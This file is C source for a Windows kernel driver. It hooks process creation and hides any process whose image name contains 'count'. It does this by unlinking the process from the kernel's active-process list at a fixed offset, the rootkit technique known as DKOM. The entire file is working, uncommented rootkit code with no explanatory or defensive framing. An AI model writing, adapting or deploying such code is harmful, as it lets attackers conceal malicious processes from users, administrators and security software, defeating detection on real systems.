#include <ntddk.h>

NTKERNELAPI UCHAR* PsGetProcessImageFileName(PEPROCESS Process);
NTSTATUS PsLookupProcessByProcessId(HANDLE ProcessId, PEPROCESS *Process);

#define ACTIVE_PROCESS_LINKS_OFFSET 0x1d8

void HideProcess(PEPROCESS Process) {
    PLIST_ENTRY TargetList = (PLIST_ENTRY)((PUCHAR)Process + ACTIVE_PROCESS_LINKS_OFFSET);
    
    if (TargetList->Flink != TargetList && TargetList->Blink != TargetList) {
        TargetList->Blink->Flink = TargetList->Flink;
        TargetList->Flink->Blink = TargetList->Blink;

        TargetList->Flink = TargetList;
        TargetList->Blink = TargetList;
        
        DbgPrint("Process hidden.\n");
    }
}

void ProcessNotifyRoutine(HANDLE ParentId, HANDLE ProcessId, BOOLEAN Create) {
    if (Create) {
        PEPROCESS Process = NULL;
        NTSTATUS status = PsLookupProcessByProcessId(ProcessId, &Process);
        
        if (NT_SUCCESS(status)) {
            UCHAR* ImageName = PsGetProcessImageFileName(Process);
            if (ImageName != NULL && strstr((char*)ImageName, "count")) {
                DbgPrint("Target Detected: %s (PID: %p)\n", ImageName, ProcessId);
                HideProcess(Process);
            }
            ObDereferenceObject(Process);
        }
    }
}

void DriverUnload(PDRIVER_OBJECT DriverObject) {
    PsSetCreateProcessNotifyRoutine(ProcessNotifyRoutine, TRUE);
    DbgPrint("Callback unregistered and driver unloaded.\n");
}

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    UNREFERENCED_PARAMETER(RegistryPath);
    DriverObject->DriverUnload = DriverUnload;

    NTSTATUS status = PsSetCreateProcessNotifyRoutine(ProcessNotifyRoutine, FALSE);
    if (NT_SUCCESS(status)) {
        DbgPrint("Process creation callback registered.\n");
    }

    return status;
}